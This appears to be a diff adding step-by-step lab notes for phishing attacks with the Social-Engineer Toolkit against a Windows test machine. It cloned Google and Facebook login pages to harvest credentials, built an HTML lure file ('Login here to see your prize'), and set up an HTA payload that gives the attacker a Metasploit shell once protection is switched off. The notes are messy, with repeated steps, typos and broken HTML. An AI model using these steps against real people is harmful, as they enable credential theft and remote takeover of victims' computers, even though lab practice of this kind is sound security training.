@@ -6,6 +6,54 @@
 3(Credential Harvester Attack Method)
 1(Web Templates)
 IP address for the POST back in Harvester/Tabnabbing[192.168(Metasploitable ip)]:192.168(Metasploitable ip)
+ip addr
+IP address for the POST back in Harvester/Tabnabbing[192.168(Metasploitable ip)]:192.168(Metasploitable ip)
+Select a template:2
+#Now On the victim machine. Let us assume that you have shared a file to the victim which will contain the IP Address of the attacking machine which will get the credentials.
+#open windows machine create notepad and save them as html link in desktop as"login.html" by typing below code
+<html
+<body>
+<a href = "http://192.168.(metasploitable2 ip)">Login here to see your prize</a>
+</body>
+</html>
+#Once the user clicks the link it will redirect it to the cloned google sign in page. If the victim enters any credential information and clicks on the sign in button the credential harvester on the attacker machine will receive the credentials (email:victim@gmail.com and passwords:victim123)
+#open browser in window machine and add metasplotable ip "http://192.168.(metasploitable ip)"
+#Try the same step by choosing Site Cloner to create a Facebook page
+3(Credential Harvester Attack Method)
+2(Site Cloner)
+IP address for the POST back in Harvester/Tabnabbing[192.168(Metasploitable ip)]:192.168(Metasploitable ip)
+Enter the url to clone:http://www.facebook.com
+#type: y
+#open window machine and then browser enter "http://192.168.(metasploitable ip)" 
+#then enter login and password
+7(HTA Attack Method)
+2(Site Cloner)
+Enter the url to clone:http://www.facebook.com
+2(Site Cloner)
+Enter the url to clone:http://www.facebook.com
+IP address or URL(www.ex.com)for the payload listener (LHOST) [192.168.(metasploitable ip)]:92.168.(metasploitable ip)
+2(Site Cloner)
+Enter the url to clone:http://www.facebook.com
+IP address or URL(www.ex.com)for the payload listener (LHOST) [192.168.(metasploitable ip)]:92.168.(metasploitable ip)
+443
+Ener the payload number[1-3]: 1
+#The Victim on downloading and running the file will create a link with the attacker’s machine
+open  window securit in main machine select "Virus and threat protection " offall the setting  check the dowloads in google and run that file
+sessions
+session 9
+sessions
+ipconfig
+
+
+
+
+
+
+
+
+
+
+
 
 
 
